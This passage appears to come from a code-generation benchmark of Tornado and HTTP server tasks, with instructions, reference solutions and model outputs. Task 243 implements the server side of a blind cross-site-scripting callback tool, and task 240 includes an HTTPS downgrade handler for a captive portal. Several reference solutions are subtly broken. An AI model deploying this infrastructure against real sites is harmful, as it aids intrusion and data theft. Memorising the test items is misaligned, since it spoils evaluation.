{self.server.server_address[1]}...')\n        self.server.serve_forever()\n\n    def shutdown(self) -> None:\n        logging.info('Shutting down server...')\n        self.server.shutdown()\n        self.server.server_close()"
  },
  {
    "Task_id": 233,
    "Instruction": "Task Description: Create a Python HTTP server that handles POST requests, logs event headers and content, and responds with a JSON acknowledgment.\n\nClass Description: The implementation consists of two classes: MyServer (request handler) and HTTPServerWrapper (server management). MyServer processes incoming POST requests while HTTPServerWrapper manages server lifecycle.\n\nAttributes:\n\nhostName: str - The host address to bind the server to (default: '0.0.0.0')\nserverPort: int - The port number to listen on (default: 20888)\nwebServer: HTTPServer - The HTTP server instance\n\nMethods:\n\nMyServer.do_POST() -> None - Handles POST requests by:\n  1. Printing the 'X-Yunion-Event' header\n  2. Reading and printing the request body\n  3. Sending a 200 response with JSON {'result':'ok'}\n\nHTTPServerWrapper.__init__(hostName: str = '0.0.0.0', serverPort: int = 20888) -> None - Initializes the server with given host and port\nHTTPServerWrapper.serve() -> None - Starts the server and handles requests until keyboard interrupt, then cleans up",
    "Canonical_solution": "from http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass MyServer(BaseHTTPRequestHandler):\n    def do_POST(self):\n        print(\"event\", self.headers.get('X-Yunion-Event'))\n        contlenstr = self.headers.get('Content-Length')\n        contlen = 0\n        if contlenstr and len(contlenstr) > 0:\n            contlen = int(contlenstr)\n        print(self.rfile.read(contlen))\n        self.send_response(200)\n        self.send_header(\"Content-type\", \"application/json\")\n        self.end_headers()\n        self.wfile.write(bytes('{\"result\":\"ok\"}', encoding='utf-8'))\n\nclass HTTPServerWrapper:\n    def __init__(self, hostName='0.0.0.0', serverPort=20888):\n        self.hostName = hostName\n        self.serverPort = serverPort\n        self.webServer = HTTPServer((self.hostName, self.serverPort), MyServer)\n\n    def serve(self):\n        print(\"Server started http://%s:%s\" % (self.hostName, self.serverPort))\n        try:\n            self.webServer.serve_forever()\n        except KeyboardInterrupt:\n            pass\n        self.webServer.server_close()\n        print(\"Server stopped.\")",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "right_result": "from http.server import BaseHTTPRequestHandler, HTTPServer\nimport json\n\nclass MyServer(BaseHTTPRequestHandler):\n    def do_POST(self):\n        event_header = self.headers.get('X-Yunion-Event')\n        print(f\"Received event: {event_header}\")\n\n        content_length = int(self.headers['Content-Length'])\n        post_data = self.rfile.read(content_length)\n        print(f\"Request body: {post_data.decode('utf-8')}\")\n\n        self.send_response(200)\n        self.send_header('Content-type', 'application/json')\n        self.end_headers()\n        response = json.dumps({'result': 'ok'})\n        self.wfile.write(response.encode('utf-8'))\n\nclass HTTPServerWrapper:\n    def __init__(self, hostName: str = '0.0.0.0', serverPort: int = 20888):\n        self.hostName = hostName\n        self.serverPort = serverPort\n        self.webServer = HTTPServer((self.hostName, self.serverPort), MyServer)\n\n    def serve(self):\n        try:\n            print(f\"Server started at http://{self.hostName}:{self.serverPort}\")\n            self.webServer.serve_forever()\n        except KeyboardInterrupt:\n            pass\n        finally:\n            print(\"Stopping server...\")\n            self.webServer.shutdown()\n            self.webServer.server_close()"
  },
  {
    "Task_id": 234,
    "Instruction": "Task Description: Implement a Tornado-based HTTP server for Bayesian optimization that can receive parameters and targets via POST requests, register them with a Bayesian optimization instance, and return suggested parameters for the next evaluation.\n\nClass Description: BayesianOptimizationHandler is a Tornado RequestHandler subclass that handles HTTP POST requests for Bayesian optimization. It maintains a BayesianOptimization instance and a UtilityFunction to suggest new parameters based on registered data points.\n\nAttributes:\n_bo: [BayesianOptimization] - Instance of BayesianOptimization configured with a black-box function and parameter bounds\n_uf: [UtilityFunction] - Utility function instance used for suggesting new parameters\n\nMethods:\npost: [post]() -> [None] - Handles HTTP POST requests. Expects JSON body with \"params\" and \"target\" fields to register with the optimizer. Returns suggested parameters as JSON. The method:\n1. Decodes the JSON request body\n2. Attempts to register the parameters and target with the optimizer\n3. Generates and returns new suggested parameters\n4. Writes the suggested parameters as JSON response\n\nThe class should be used as part of a Tornado web application that listens on a specified port for optimization requests.",
    "Canonical_solution": "import json\nimport tornado.ioloop\nimport tornado.httpserver\nfrom tornado.web import RequestHandler\nimport requests\n\nclass BayesianOptimizationHandler(RequestHandler):\n    \"\"\"Basic functionality for NLP handlers.\"\"\"\n    _bo = BayesianOptimization(\n        f=black_box_function,\n        pbounds={\"x\": (-4, 4), \"y\": (-3, 3)}\n    )\n    _uf = UtilityFunction(kind=\"ucb\", kappa=3, xi=1)\n\n    def post(self):\n        \"\"\"Deal with incoming requests.\"\"\"\n        body = tornado.escape.json_decode(self.request.body)\n\n        try:\n            self._bo.register(\n                params=body[\"params\"],\n                target=body[\"target\"],\n            )\n            print(\"BO has registered: {} points.\".format(len(self._bo.space)), end=\"\\n\\n\")\n        except KeyError:\n            pass\n        finally:\n            suggested_params = self._bo.suggest(self._uf)\n\n        self.write(json.dumps(suggested_params))\n\ndef run_optimization_app():\n    asyncio.set_event_loop(asyncio.new_event_loop())\n    handlers = [\n        (r\"/bayesian_optimization\", BayesianOptimizationHandler),\n    ]\n    server = tornado.httpserver.HTTPServer(\n        tornado.web.Application(handlers)\n    )\n    server.listen(9009)\n    tornado.ioloop.IOLoop.instance().start()",
    "Code_level": "Class-level",
    "FSMID_for_test": 64,
    "right_result": "import tornado.ioloop\nimport tornado.web\nfrom bayes_opt import BayesianOptimization\nfrom bayes_opt.util import UtilityFunction\nimport json\n\nclass BayesianOptimizationHandler(tornado.web.RequestHandler):\n    def initialize(self):\n        self._bo = BayesianOptimization(f=None, pbounds={\"x\": (0, 1)})\n        self._uf = UtilityFunction(kind=\"ucb\", kappa=2.5)\n\n    def post(self):\n        try:\n            data = json.loads(self.request.body)\n            params = data.get(\"params\")\n            target = data.get(\"target\")\n\n            if params is None or target is None:\n                raise ValueError(\"Missing 'params' or 'target' in request body\")\n\n            self._bo.register(params=params, target=target)\n            suggested_params = self._bo.suggest(utility_function=self._uf)\n            self.write(json.dumps(suggested_params))\n        except Exception as e:\n            self.set_status(400)\n            self.write(json.dumps({\"error\": str(e)}))\n\ndef make_app():\n    return tornado.web.Application([\n        (r\"/optimize\", BayesianOptimizationHandler),\n    ])\n\nif __name__ == \"__main__\":\n    app = make_app()\n    app.listen(8888)\n    tornado.ioloop.IOLoop.current().start()"
  },
  {
    "Task_id": 235,
    "Instruction": "Task Description: Create a Tornado-based HTTP server that serves coverage badge images based on project coverage data stored in files. The server should handle GET requests, read coverage data from files, and redirect to appropriate badge images based on coverage percentage.\n\nClass Description: CoverageBadgeServer is a Tornado web application that serves dynamic coverage badges. It initializes a web server that listens for requests and routes them to a handler that processes coverage data.\n\nAttributes:\n- port: int - The port number on which the server will listen (default: 8888)\n- address: str - The IP address to bind the server to (default: '127.0.0.1')\n- application: tornado.web.Application - The Tornado web application instance\n\nMethods:\n- __init__(port: int = 8888, address: str = '127.0.0.1') -> None - Initializes the server with specified port and address, sets up URL routing\n- start() -> None - Starts the Tornado web server and begins listening for requests\n\nClass Description: MainHandler is a Tornado request handler that processes GET requests for coverage badges.\n\nMethods:\n- get(project: str) -> None - Handles GET requests:\n  - Input: project - The project name from the URL path\n  - Behavior:\n    1. Attempts to read coverage data from '/tmp/{project}-coverage' file\n    2. Determines badge color based on coverage percentage (\u226580% = green, <80% = yellow)\n    3. Redirects to appropriate shields.io badge URL\n    4. Returns 404 if coverage file not found\n  - Output: HTTP redirect to badge image or 404 error",
    "Canonical_solution": "import tornado.ioloop\nimport tornado.web\nimport urllib\n\nclass MainHandler(tornado.web.RequestHandler):\n    def get(self, project):\n        try:\n            with open('/tmp/%s-coverage' % project, 'rb') as f:\n                coverage = f.read().strip()\n                n = int(coverage.strip('%'))\n                if n >= 80:\n                    color = 'brightgreen'\n                else:\n                    color = 'yellow'\n                self.redirect(('https://img.shields.io/badge/'\n                               'coverage-%s-%s.svg'\n                               '?style=flat') %\n                              (urllib.quote(coverage), color))\n        except IOError:\n            raise tornado.web.HTTPError(404)\n\nclass CoverageBadgeServer:\n    def __init__(self, port=8888, address='127.0.0.1'):\n        self.port = port\n        self.address = address\n        self.application = tornado.web.Application([\n            (r\"/([a-zA-Z0-9\\-_]+)\", MainHandler),\n        ])\n\n    def start(self):\n        self.application.listen(self.port, address=self.address)\n        tornado.ioloop.IOLoop.instance().start()",
    "Code_level": "Class-level",
    "FSMID_for_test": 64,
    "right_result": "import tornado.ioloop\nimport tornado.web\nimport os\n\nclass MainHandler(tornado.web.RequestHandler):\n    def get(self, project):\n        coverage_file = f'/tmp/{project}-coverage'\n        if not os.path.exists(coverage_file):\n            self.set_status(404)\n            return\n        try:\n            with open(coverage_file, 'r') as f:\n                coverage = float(f.read().strip())\n        except (ValueError, IOError):\n            self.set_status(404)\n            return\n        \n        color = 'green' if coverage >= 80 else 'yellow'\n        badge_url = f'https://img.shields.io/badge/coverage-{coverage:.0f}%25-{color}.svg'\n        self.redirect(badge_url)\n\nclass CoverageBadgeServer:\n    def __init__(self, port=8888, address='127.0.0.1'):\n        self.port = port\n        self.address = address\n        self.application = tornado.web.Application([\n            (r\"/coverage/(.+)\", MainHandler),\n        ])\n    \n    def start(self):\n        self.application.listen(self.port, self.address)\n        tornado.ioloop.IOLoop.current().start()"
  },
  {
    "Task_id": 236,
    "Instruction": "Task Description: Create a Tornado-based HTTP server application that handles web requests and responds with a simple message.\n\nClass Description: The TornadoApp class encapsulates a Tornado web server with configurable port settings. It initializes the web application with route handlers and provides a method to start the server.\n\nAttributes:\n- port: int - The port number on which the server will listen (default: 8888)\n- app: tornado.web.Application - The Tornado web application instance that manages request routing\n\nMethods:\n- __init__(port: int = 8888) -> None - Initializes the Tornado application with the specified port and sets up the route handler\n- run() -> None - Starts the Tornado web server on the specified port and begins processing requests\n\nAdditional Class (MainHandler):\nClass Description: The MainHandler class processes HTTP GET requests to the root URL and returns a simple text response.\n\nMethods:\n- get() -> None - Handles GET requests to the root URL and writes \"Hello, world\" as the response",
    "Canonical_solution": "import tornado.web\n\nclass MainHandler(tornado.web.RequestHandler):\n    def get(self):\n        self.write(\"Hello, world\")\n\nclass TornadoApp:\n    def __init__(self, port: int = 8888):\n        self.port = port\n        self.app = tornado.web.Application(\n            [\n                (r\"/\", MainHandler),\n            ]\n        )\n\n    def run(self):\n        self.app.listen(self.port)\n        tornado.ioloop.IOLoop.current().start()",
    "Code_level": "Class-level",
    "FSMID_for_test": 64,
    "right_result": "import tornado.ioloop\nimport tornado.web\n\nclass MainHandler(tornado.web.RequestHandler):\n    def get(self):\n        self.write(\"Hello, world\")\n\nclass TornadoApp:\n    def __init__(self, port: int = 8888) -> None:\n        self.port = port\n        self.app = tornado.web.Application([\n            (r\"/\", MainHandler),\n        ])\n\n    def run(self) -> None:\n        self.app.listen(self.port)\n        tornado.ioloop.IOLoop.current().start()"
  },
  {
    "Task_id": 237,
    "Instruction": "Task Description: Create a Tornado-based HTTP server that can handle specific URL routes for string manipulation, including reversing strings and wrapping text to a specified width.\n\nClass Description: TornadoHTTPServer is a class that encapsulates the setup and execution of a Tornado web server with predefined request handlers for string operations.\n\nAttributes:\n- app: tornado.web.Application - The Tornado web application instance that manages URL routing and handlers\n- http_server: tornado.httpserver.HTTPServer - The HTTP server instance that serves the application\n- port: int - The port number on which the server listens (default: 8000)\n\nMethods:\n- __init__(port: int = 8000) -> None - Initializes the HTTP server with specified port and sets up URL routing\n  - port: int - The port number to bind the server to (default: 8000)\n- start() -> None - Starts the HTTP server and begins listening for incoming requests\n  - No parameters\n  - No return value (runs indefinitely until interrupted)\n\nAdditional Handler Classes:\n- ReverseHandler: tornado.web.RequestHandler - Handles GET requests for string reversal\n  - get(input_word: str) -> None - Reverses the input string and writes it to response\n    - input_word: str - The string to be reversed (captured from URL)\n- WrapHandler: tornado.web.RequestHandler - Handles POST requests for text wrapping\n  - post() -> None - Wraps text to specified width and writes to response\n    - Retrieves 'name' (text) and 'width' (optional, default 40) from POST parameters",
    "Canonical_solution": "import tornado.httpserver\nimport tornado.ioloop\nimport tornado.web\nfrom tornado.options import define, options\n\ndefine(\"port\", default=8000, help=\"Please send email to me\", type=int)\n\nclass ReverseHandler(tornado.web.RequestHandler):\n    def get(self, input_word):\n        self.write(input_word[::-1])\n\nclass WrapHandler(tornado.web.RequestHandler):\n    def post(self):\n        text = self.get_argument(\"name\")\n        width = self.get_argument(\"width\", 40)\n        self.write(textwrap.fill(word, width))\n\nclass TornadoHTTPServer:\n    def __init__(self, port=8000):\n        options.port = port\n        self.app = tornado.web.Application(\n            handlers=[\n                (r\"/reverse/(\\w+)\", ReverseHandler),\n                (r\"/wrap/(/w+)\", WrapHandler)\n            ]\n        )\n        self.http_server = tornado.httpserver.HTTPServer(self.app)\n\n    def start(self):\n        self.http_server.listen(options.port)\n        tornado.ioloop.IOLoop.instance().start()",
    "Code_level": "Class-level",
    "FSMID_for_test": 64,
    "right_result": "import tornado.ioloop\nimport tornado.web\nimport textwrap\n\nclass ReverseHandler(tornado.web.RequestHandler):\n    def get(self, input_word):\n        reversed_word = input_word[::-1]\n        self.write(reversed_word)\n\nclass WrapHandler(tornado.web.RequestHandler):\n    def post(self):\n        name = self.get_argument('name')\n        width = int(self.get_argument('width', 40))\n        wrapped_text = textwrap.fill(name, width=width)\n        self.write(wrapped_text)\n\nclass TornadoHTTPServer:\n    def __init__(self, port=8000):\n        self.port = port\n        self.app = tornado.web.Application([\n            (r\"/reverse/(\\w+)\", ReverseHandler),\n            (r\"/wrap\", WrapHandler),\n        ])\n        self.http_server = tornado.httpserver.HTTPServer(self.app)\n\n    def start(self):\n        self.http_server.listen(self.port)\n        tornado.ioloop.IOLoop.current().start()"
  },
  {
    "Task_id": 239,
    "Instruction": "Task Description: Create a Tornado-based HTTP server that handles web requests, serves static files, and manages user comments through a React component.\n\nClass Description: TornadoServer is a class that encapsulates a Tornado web server with routing, request handling, and server management capabilities.\n\nAttributes:\n- urls: [List] - A list of URL patterns and their corresponding handlers\n- settings: [Dict] - Configuration settings for the Tornado application including paths, security, and debug options\n- application: [tornado.web.Application] - The main Tornado web application instance\n\nMethods:\n- __init__: [Name](self) -> [None] - Initializes the server with URL routing and application settings\n- run: [Name](self, port=int) -> [None] - Starts the HTTP server on the specified port and begins the I/O loop\n\nAdditional Handler Classes:\n1. CommentHandler (inherits from tornado.web.RequestHandler):\n   Methods:\n   - post: [Name](self) -> [None] - Handles POST requests for submitting comments and redirects to the home page\n\n2. IndexHandler (inherits from tornado.web.RequestHandler):\n   Methods:\n   - get: [Name](self) -> [None] - Handles GET requests for the home page, renders a React component, and displays it in a template",
    "Canonical_solution": "import os\nimport tornado.ioloop\nimport tornado.httpserver\nfrom tornado.web import RequestHandler\nfrom tornado.gen import coroutine\nfrom react.render import render_component\n\nclass CommentHandler(RequestHandler):\n    @coroutine\n    def post(self):\n        comments = []\n        comments.append({\n            'author': self.get_argument('author'),\n            'text': self.get_argument('text'),\n        })\n        self.redirect('/')\n\nclass IndexHandler(RequestHandler):\n    @coroutine\n    def get(self):\n        comments = []\n        rendered = render_component(\n            os.path.join(os.getcwd(), 'static', 'js', 'CommentBox.jsx'),\n            {\n                'comments': comments,\n                'url': '/comments',\n                'xsrf': self.xsrf_token\n            },\n            to_static_markup=False,\n        )\n        self.render('index.html', rendered=rendered)\n\nclass TornadoServer:\n    def __init__(self):\n        self.urls = [\n            (r\"/\", IndexHandler),\n            (r\"/comments\", CommentHandler),\n            (r\"/(.*)\", tornado.web.StaticFileHandler, {\"path\": r\"{0}\".format(os.path.join(os.path.dirname(__file__), \"static\"))},\n        ]\n        self.settings = {\n            \"template_path\": os.path.join(os.path.dirname(__file__), \"templates\"),\n            \"static_path\": os.path.join(os.path.dirname(__file__), \"static\"),\n            \"cookie_secret\": os.urandom(12),\n            \"xsrf_cookies\": True,\n            \"debug\": True,\n            \"compress_response\": True\n        }\n        self.application = tornado.web.Application(self.urls, **self.settings)\n\n    def run(self, port=8000):\n        server = tornado.httpserver.HTTPServer(self.application)\n        server.listen(port)\n        tornado.ioloop.IOLoop.instance().start()",
    "Code_level": "Class-level",
    "FSMID_for_test": 64,
    "right_result": "import tornado.ioloop\nimport tornado.web\nimport os\n\nclass CommentHandler(tornado.web.RequestHandler):\n    def post(self):\n        comment = self.get_argument(\"comment\")\n        with open(\"comments.txt\", \"a\") as f:\n            f.write(comment + \"\\n\")\n        self.redirect(\"/\")\n\nclass IndexHandler(tornado.web.RequestHandler):\n    def get(self):\n        comments = []\n        if os.path.exists(\"comments.txt\"):\n            with open(\"comments.txt\", \"r\") as f:\n                comments = f.readlines()\n        self.render(\"index.html\", comments=comments)\n\nclass TornadoServer:\n    def __init__(self):\n        self.urls = [\n            (r\"/\", IndexHandler),\n            (r\"/submit\", CommentHandler),\n            (r\"/static/(.*)\", tornado.web.StaticFileHandler, {\"path\": \"static\"}),\n        ]\n        self.settings = {\n            \"template_path\": \"templates\",\n            \"static_path\": \"static\",\n            \"debug\": True,\n            \"cookie_secret\": \"__TODO:_GENERATE_YOUR_OWN_RANDOM_VALUE_HERE__\",\n        }\n        self.application = tornado.web.Application(self.urls, **self.settings)\n\n    def run(self, port=8080):\n        self.application.listen(port)\n        tornado.ioloop.IOLoop.current().start()"
  },
  {
    "Task_id": 240,
    "Instruction": "Task Description: Create a Python class that implements an HTTP server using the Tornado framework to handle backend requests and serve static content, with support for both HTTP and HTTPS connections.\n\nClass Description: The HTTPServer class initializes and runs a Tornado-based web server that can handle backend API requests and serve static files, with separate configurations for HTTP and HTTPS ports.\n\nAttributes:\n- ip: str - The IP address to bind the server to\n- port: int - The HTTP port number to listen on\n- ssl_port: int - The HTTPS port number to listen on\n- template: object - An object providing template paths for static content\n- em: object - An event manager object providing backend functionality\n\nMethods:\n- __init__(ip: str, port: int, ssl_port: int, template: object, em: object) -> None - Initializes the server with configuration parameters\n- run() -> None - Starts the HTTP and HTTPS servers and begins the I/O loop\n\nAdditional Class Descriptions:\n\nBackendHandler (extends tornado.web.RequestHandler):\n- Purpose: Handles POST requests to the backend API endpoint\nAttributes:\n- em: object - Event manager object providing backend methods\nMethods:\n- initialize(em: object) -> None - Initializes the handler with the event manager\n- post() -> None - Processes POST requests, executes backend methods, and returns JSON responses\n\nCaptivePortalHandler (mentioned but not shown in reference):\n- Purpose: Handles requests to the captive portal (implementation not shown)\n\nDowngradeToHTTP (mentioned but not shown in reference):\n- Purpose: Handles HTTPS requests by downgrading them to HTTP (implementation not shown)",
    "Canonical_solution": "import tornado.web\nimport tornado.httpserver\nimport tornado.ioloop\nimport json\nfrom tornado.escape import json_decode, url_unescape\n\nclass BackendHandler(tornado.web.RequestHandler):\n    def initialize(self, em):\n        self.em = em\n\n    def post(self):\n        json_obj = json_decode(self.request.body)\n        response_to_send = {}\n        backend_methods = self.em.get_backend_funcs()\n        \n        for func_name in list(json_obj.keys()):\n            if func_name in backend_methods:\n                callback = getattr(backend_methods[func_name], func_name)\n                response_to_send[func_name] = callback(json_obj[func_name])\n            else:\n                response_to_send[func_name] = \"NotFound\"\n\n        self.write(json.dumps(response_to_send))\n\nclass HTTPServer:\n    def __init__(self, ip, port, ssl_port, template, em):\n        self.ip = ip\n        self.port = port\n        self.ssl_port = ssl_port\n        self.template = template\n        self.em = em\n\n    def run(self):\n        app = tornado.web.Application(\n            [\n                (r\"/backend/.*\", BackendHandler, {\"em\": self.em}),\n                (r\"/.*\", CaptivePortalHandler),\n            ],\n            template_path=self.template.get_path(),\n            static_path=self.template.get_path_static(),\n            compiled_template_cache=False,\n            ui_methods=uimethods)\n        app.listen(self.port, address=self.ip)\n\n        ssl_app = tornado.web.Application([(r\"/.*\", DowngradeToHTTP)], port=self.port)\n        https_server = tornado.httpserver.HTTPServer(\n            ssl_app,\n            ssl_options={\n                \"certfile\": constants.PEM,\n                \"keyfile\": constants.PEM,\n            })\n        https_server.listen(self.ssl_port, address=self.ip)\n\n        tornado.ioloop.IOLoop.instance().start()",
    "Code_level": "Class-level",
    "FSMID_for_test": 64,
    "right_result": "import tornado.ioloop\nimport tornado.web\nimport tornado.httpserver\nimport ssl\nimport json\n\nclass BackendHandler(tornado.web.RequestHandler):\n    def initialize(self, em):\n        self.em = em\n\n    def post(self):\n        try:\n            data = json.loads(self.request.body)\n            response = self.em.process_backend_request(data)\n            self.write(json.dumps(response))\n        except Exception as e:\n            self.set_status(500)\n            self.write(json.dumps({\"error\": str(e)}))\n\nclass HTTPServer:\n    def __init__(self, ip: str, port: int, ssl_port: int, template: object, em: object):\n        self.ip = ip\n        self.port = port\n        self.ssl_port = ssl_port\n        self.template = template\n        self.em = em\n\n        handlers = [\n            (r\"/api/backend\", BackendHandler, dict(em=em)),\n            (r\"/static/(.*)\", tornado.web.StaticFileHandler, {\"path\": self.template.static_path}),\n            (r\"/\", tornado.web.RedirectHandler, {\"url\": \"/static/index.html\"}),\n        ]\n\n        settings = {\n            \"template_path\": self.template.template_path,\n            \"static_path\": self.template.static_path,\n            \"debug\": True,\n        }\n\n        self.application = tornado.web.Application(handlers, **settings)\n        self.http_server = tornado.httpserver.HTTPServer(self.application)\n        \n        ssl_options = {\n            \"certfile\": self.template.cert_file,\n            \"keyfile\": self.template.key_file,\n        }\n        \n        self.https_server = tornado.httpserver.HTTPServer(self.application, ssl_options=ssl_options)\n\n    def run(self):\n        self.http_server.listen(self.port, address=self.ip)\n        self.https_server.listen(self.ssl_port, address=self.ip)\n        tornado.ioloop.IOLoop.current().start()"
  },
  {
    "Task_id": 241,
    "Instruction": "Task Description: Create a threaded HTTP server using the Tornado framework that echoes JSON responses for GET and POST requests, allowing for concurrent operation and graceful shutdown.\n\nClass Description: JSONEchoServer is a threaded HTTP server implementation that runs a Tornado web application to handle JSON echo requests. It provides methods to start, stop, and check the server status.\n\nAttributes:\n- lock: threading.Lock - A synchronization primitive used to coordinate server startup\n- port: int - The TCP port number on which the server will listen\n- _stop: threading.Event - An event flag used to control server shutdown\n- daemon: bool - Thread daemon flag indicating whether the thread should exit when the main program exits\n\nMethods:\n- __init__(lock, port, *args, **kw) -> None - Initializes the server thread with a lock and port number\n- stop() -> None - Signals the server to stop by setting the stop event\n- stopped() -> bool - Returns True if the server has been signaled to stop\n- setup_application() -> tornado.web.Application - Creates and returns the Tornado web application with configured routes\n- run() -> None - Main thread execution method that starts the Tornado I/O loop and web server",
    "Canonical_solution": "import os\nimport json\nimport socket\nimport threading\nimport tornado.ioloop\nimport tornado.web\nfrom functools import wraps\n\nclass JSONEchoHandler(tornado.web.RequestHandler):\n    def get(self, matched):\n        payload = dict([(x, self.get_argument(x)) for x in self.request.arguments])\n        self.write(json.dumps({matched or 'index': payload}, indent=4))\n\n    def post(self, matched):\n        payload = dict(self.request.arguments)\n        self.write(json.dumps({\n            matched or 'index': payload,\n            'req_body': self.request.body.decode('utf-8'),\n            'req_headers': dict(self.request.headers.items()),\n        }, indent=4))\n\nclass JSONEchoServer(threading.Thread):\n    def __init__(self, lock, port, *args, **kw):\n        self.lock = lock\n        self.port = int(port)\n        self._stop = threading.Event()\n        super(JSONEchoServer, self).__init__(*args, **kw)\n        self.daemon = True\n\n    def stop(self):\n        self._stop.set()\n\n    def stopped(self):\n        return self._stop.isSet()\n\n    def setup_application(self):\n        return tornado.web.Application([\n            (r\"/(.*)\", JSONEchoHandler),\n        ])\n\n    def run(self):\n        loop = tornado.ioloop.IOLoop()\n        application = self.setup_application()\n        application.listen(self.port)\n        self.lock.release()\n        loop.start()",
    "Code_level": "Class-level",
    "FSMID_for_test": 64,
    "right_result": "import threading\nimport tornado.ioloop\nimport tornado.web\nimport tornado.escape\nimport socket\n\nclass JSONEchoServer(threading.Thread):\n    def __init__(self, lock, port, daemon=True):\n        super().__init__()\n        self.lock = lock\n        self.port = port\n        self._stop = threading.Event()\n        self.daemon = daemon\n        self.application = None\n        self.server = None\n\n    def stop(self):\n        self._stop.set()\n\n    def stopped(self):\n        return self._stop.is_set()\n\n    def setup_application(self):\n        class EchoHandler(tornado.web.RequestHandler):\n            def set_default_headers(self):\n                self.set_header(\"Content-Type\", 'application/json')\n\n            def get(self):\n                data = {k: self.get_argument(k) for k in self.request.arguments}\n                self.write(data)\n\n            def post(self):\n                try:\n                    data = tornado.escape.json_decode(self.request.body)\n                except Exception:\n                    data = {}\n                self.write(data)\n\n        self.application = tornado.web.Application([\n            (r\"/.*\", EchoHandler),\n        ])\n        return self.application\n\n    def run(self):\n        with self.lock:\n            self.setup_application()\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n            sock.bind(('localhost', self.port))\n            sock.listen(128)\n            self.server = tornado.httpserver.HTTPServer(self.application)\n            self.server.add_socket(sock)\n\n        tornado.ioloop.IOLoop.current().add_callback(self.check_stop)\n        tornado.ioloop.IOLoop.current().start()\n\n    def check_stop(self):\n        if self.stopped():\n            self.server.stop()\n            tornado.ioloop.IOLoop.current().stop()\n        else:\n            tornado.ioloop.IOLoop.current().call_later(0.1, self.check_stop)"
  },
  {
    "Task_id": 243,
    "Instruction": "Task Description: Implement a Tornado-based HTTP server with request handlers for processing JavaScript callbacks and serving dynamic homepage content.\n\nClass Description: The TornadoHTTPServer class initializes and runs a Tornado web application with two main handlers: CallbackHandler for processing POST requests containing callback data, and HomepageHandler for serving dynamic JavaScript content based on user-specific configurations.\n\nAttributes:\n- settings: [dict] - Configuration dictionary containing server settings like cookie_secret\n- app: [tornado.web.Application] - The Tornado web application instance\n\nMethods:\n- __init__: [Name](settings: dict) -> [None] - Initializes the server with given settings and sets up URL routing\n- start: [Name](port: int = 8888) -> [None] - Starts the server listening on the specified port and begins the I/O loop\n\nClass Description: BaseHandler serves as the base request handler class providing common functionality for all handlers.\n\nAttributes:\n- (Inherited from tornado.web.RequestHandler)\n\nMethods:\n- __init__: [Name](*args, **kwargs) -> [None] - Initializes the handler and sets Content-Type header based on URI\n- options: [Name]() -> [None] - Handles OPTIONS requests (empty implementation)\n- throw_404: [Name]() -> [None] - Sends a 404 response with \"Resource not found\" message\n- on_finish: [Name]() -> [None] - Cleanup method called when request finishes (closes session)\n\nClass Description: CallbackHandler processes POST requests containing callback data, either in PGP-encrypted or plain JSON format.\n\nAttributes:\n- (Inherited from BaseHandler)\n\nMethods:\n- post: [Name]() -> [None] - Processes POST requests, validates user, and handles callback data (PGP or JSON)\n\nClass Description: HomepageHandler serves dynamic JavaScript content customized for each user.\n\nAttributes:\n- (Inherited from BaseHandler)\n\nMethods:\n- get: [Name](path: str) -> [None] - Serves customized JavaScript content based on user configuration and request path",
    "Canonical_solution": "import tornado.web\nimport tornado.ioloop\nfrom tornado import gen\n\nclass BaseHandler(tornado.web.RequestHandler):\n    def __init__(self, *args, **kwargs):\n        super(BaseHandler, self).__init__(*args, **kwargs)\n        if self.request.uri.startswith(\"/api/\"):\n            self.set_header(\"Content-Type\", \"application/json\")\n        else:\n            self.set_header(\"Content-Type\", \"application/javascript\")\n\n    def options(self):\n        pass\n\n    def throw_404(self):\n        self.set_status(404)\n        self.write(\"Resource not found\")\n\n    def on_finish(self):\n        session.close()\n\nclass CallbackHandler(BaseHandler):\n    def post(self):\n        self.set_header('Access-Control-Allow-Origin', '*')\n        self.set_header('Access-Control-Allow-Methods', 'POST, GET, HEAD, OPTIONS')\n        self.set_header('Access-Control-Allow-Headers', 'X-Requested-With')\n\n        owner_user = self.get_user_from_subdomain()\n        if owner_user == None:\n            self.throw_404()\n            return\n\n        if \"-----BEGIN PGP MESSAGE-----\" in self.request.body:\n            if owner_user.email_enabled:\n                send_javascript_pgp_encrypted_callback_message(self.request.body, owner_user.email)\n        else:\n            callback_data = json.loads(self.request.body)\n            callback_data['ip'] = self.request.remote_ip\n            injection_db_record = record_callback_in_database(callback_data, self)\n            if owner_user.email_enabled:\n                send_javascript_callback_message(owner_user.email, injection_db_record)\n            self.write('{}')\n\nclass HomepageHandler(BaseHandler):\n    def get(self, path):\n        self.set_header(\"Access-Control-Allow-Origin\", \"*\")\n        self.set_header(\"Access-Control-Allow-Methods\", \"OPTIONS, PUT, DELETE, POST, GET\")\n        self.set_header(\"Access-Control-Allow-Headers\", \"X-Requested-With, Content-Type, Origin, Authorization, Accept, Accept-Encoding\")\n\n        user = self.get_user_from_subdomain()\n        if user == None:\n            self.throw_404()\n            return\n\n        new_probe = probejs\n        new_probe = new_probe.replace('[HOST_URL]', \"https://\" + self.request.headers.get('Host'))\n        new_probe = new_probe.replace('[PGP_REPLACE_ME]', json.dumps(user.pgp_key))\n        new_probe = new_probe.replace('[CHAINLOAD_REPLACE_ME]', json.dumps(user.chainload_uri))\n        new_probe = new_probe.replace('[COLLECT_PAGE_LIST_REPLACE_ME]', json.dumps(user.get_page_collection_path_list()))\n\n        if user.pgp_key != \"\":\n            with open(\"templates/pgp_encrypted_template.txt\", \"r\") as template_handler:\n                new_probe = new_probe.replace('[TEMPLATE_REPLACE_ME]', json.dumps(template_handler.read()))\n        else:\n            new_probe = new_probe.replace('[TEMPLATE_REPLACE_ME]', json.dumps(\"\"))\n\n        if self.request.uri != \"/\":\n            probe_id = self.request.uri.split(\"/\")[1]\n            self.write(new_probe.replace(\"[PROBE_ID]\", probe_id))\n        else:\n            self.write(new_probe)\n\nclass TornadoHTTPServer:\n    def __init__(self, settings):\n        self.settings = settings\n        self.app = tornado.web.Application([\n            (r\"/js_callback\", CallbackHandler),\n            (r\"/(.*)\", HomepageHandler),\n        ], cookie_secret=settings[\"cookie_secret\"])\n\n    def start(self, port=8888):\n        self.app.listen(port)\n        tornado.ioloop.IOLoop.current().start()",
    "Code_level": "Class-level",
    "FSMID_for_test": 64,
